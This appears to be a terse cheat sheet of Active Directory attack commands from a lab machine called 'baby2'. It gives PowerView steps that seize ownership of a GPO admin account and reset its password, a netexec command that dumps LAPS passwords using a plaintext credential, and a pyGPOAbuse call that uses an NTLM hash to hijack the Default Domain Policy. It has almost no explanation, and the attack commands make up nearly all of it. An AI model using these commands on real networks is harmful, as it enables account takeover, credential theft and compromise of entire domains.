- Generic All :
```sh
Import-Module ./PowerView.ps1

Set-DomainObjectOwner -identity gpoadm -OwnerIdentity Amelia.Griffiths 

Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights ResetPassword 

$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force

Set-DomainUserPassword -identity gpoadm -accountpassword $cred
```

- Generic All 2 :
```sh
netexec smb 10.10.211.230 -u abbie.smith -p "CMe1x+nlRaaWEw" --laps
#If laps enable
```

- GPO Abuse :
```sh
#GPOabuse
pygpoabuse.py baby2.vl/gpoadm -hashes ":20DEF05980FC9E4C846AE5530963B573" -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -dc-ip 10.10.109.95 
```

Tool: https://github.com/Hackndo/pyGPOAbuse.git
